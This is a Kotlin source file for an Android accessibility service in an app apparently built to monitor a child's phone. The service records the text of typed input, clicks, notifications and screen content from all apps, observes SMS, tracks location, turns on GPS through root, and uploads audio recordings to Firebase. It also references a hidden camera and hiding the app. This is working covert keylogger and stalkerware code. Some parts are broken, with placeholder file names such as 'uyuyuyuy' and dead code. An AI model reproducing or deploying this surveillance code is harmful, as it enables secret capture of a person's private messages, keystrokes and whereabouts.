package com.github.midros.istheapp.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import android.view.accessibility.AccessibilityEvent
import com.github.midros.istheapp.app.IsTheApp
import com.github.midros.istheapp.data.model.ChildPhoto
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.sms.SmsObserver
import com.github.midros.istheapp.utils.*
import com.github.midros.istheapp.utils.ConstFun.enableGpsRoot
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.isRoot
import com.github.midros.istheapp.utils.ConstFun.showApp
import com.github.midros.istheapp.utils.Consts.PARAMS
import com.github.midros.istheapp.utils.Consts.RECORDING
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.google.firebase.database.DatabaseReference
import com.pawegio.kandroid.i
import com.pawegio.kandroid.runDelayedOnUiThread
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import io.reactivex.android.schedulers.AndroidSchedulers

/**
 * Created by luis rafael on 17/03/18.
 */
class AccessibilityDataService : AccessibilityService(), LocationListener {

    companion object {
        var isRunningService: Boolean = false
    }

    @Inject
    lateinit var interactor: InteractorAccessibilityData

    @Inject
    lateinit var firebase: InterfaceFirebase
    private lateinit var locationManager: LocationManager
    private var timer2: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        //    cancelTimer()
        FileHelper.deleteFile("hhh")
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""
    private var disposable: CompositeDisposable = CompositeDisposable()
    override fun onCreate() {
        super.onCreate()
        IsTheApp.appComponent.inject(this)
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        interactor.getRecordingAudio()
        registerSmsObserver()
    }

    private fun registerSmsObserver() =
        contentResolver.registerContentObserver(
            Telephony.Sms.CONTENT_URI,
            true,
            SmsObserver(this, Handler())
        )

    override fun onInterrupt() {}
    private fun getReference(child: String): DatabaseReference =   firebase.getDatabaseReference(child)

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        var packageName = ""
        if (event.packageName != null) {
            packageName = event.packageName.toString() + ":"
        }
        Log.i(TAG, "onAccessibilityEvent $packageName");

        try {
            val data = event.text.toString()
            var data1 = ""
            if (event.contentDescription != null)
                data1 = event.contentDescription.toString()
            if (data != "[]") {
                val data = packageName + event.text.toString()
                interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                i(TAG, "${getDateTime()} |(TEXT)| $data")

                //      val filePath = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" //${Consts.ADDRESS_AUDIO_RECORD}";
                var dateName = "" //fileName!!.replace("$filePath/", "")
                var uri = Uri.fromFile(File("fileName")) //file:///storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/28%20sept.%202022%2002%3A19%20p.%20m.%2C1664392755930.mp3
            }

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                        i(TAG, "${getDateTime()} |(TEXT)| $data")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                        i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    if (data != "[]") {
                        var data = packageName + event.text.toString()
                        data = packageName + ": " + data;
                        interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                        i(TAG, "${getDateTime()} |(CLICKED)| $data")
             }
        //            else {
//                        val data = event.contentDescription.toString()
//                    }
                }
                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {

                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(LONG CLICKED)| $data")
                        i(TAG, "${getDateTime()} |(LONG CLICKED)| $data")
                    }
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(NOTIFICACION)| $data")
                        i(TAG, "${getDateTime()} |(NOTIFICACION)| $data")
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(CONTENT_CHANGED)| $data")
                        i(TAG, "${getDateTime()} |(CONTENT_CHANGED)| $data")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(CONTENT_CHANGED)| $data")
                        i(TAG, "${getDateTime()} |(CONTENT_CHANGED)| $data")
                    }
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(STATE_CHANGED)| $data")
                        i(TAG, "${getDateTime()} |(STATE_CHANGED)| $data")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_SELECTED -> {
                    if (data != "[]") {
                        val data = packageName + event.text.toString()
                        interactor.setDataKey("${getDateTime()} |(VIEW_SELECTED)| $data")
                        i(TAG, "${getDateTime()} |(VIEW_SELECTED)| $data")
                    }
                }
            }
        } catch (e: Throwable) {
//            sendFile()
            Log.i("error", e.message.toString())
            //        e(Consts.TAG, e.message.toString())
            //  errorAction()
        }
    }

    private fun sendFileAudio() {
        val filePath = "" // "${context.getFilePath()}/${Consts.ADDRESS_AUDIO_RECORD}"
        val dateName = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        disposable.add(
            firebase.putFile("$RECORDING/$dateName", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                    {
                        setPushName()
                    },
                    {
                        deleteFile(fileName)
                    })
        )
    }

    private fun setPushName() {
        val duration = FileHelper.getDurationFile(fileName!!)
        val recording = Recording(nameAudio, dateTime, duration)
        firebase.getDatabaseReference("$RECORDING/${Consts.DATA}").push().setValue(recording)
        deleteFile(fileName)
    }

    private fun sendFileCall() {
        fileName = "uyuyuyuy"
    }

    override fun onServiceConnected() {
        isRunningService = true
        interactor.setRunServiceData(true)
        interactor.getSocialStatus()
        interactor.startCountDownTimer()
        super.onServiceConnected()
    }

    override fun onDestroy() {
        isRunningService = false
        interactor.stopCountDownTimer()
        interactor.setRunServiceData(false)
        interactor.clearDisposable()
        super.onDestroy()
    }


    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission( this, Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        } else
            interactor.enablePermissionLocation(false)
    }

    override fun onLocationChanged(location: Location) = interactor.setDataLocation(location)

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String?) {
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            interactor.enableGps(true)
    }

    override fun onProviderDisabled(provider: String?) {
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            interactor.enableGps(false)
        runDelayedOnUiThread(3000) {
            if (isRoot())
                enableGpsRoot()
        }
    }

}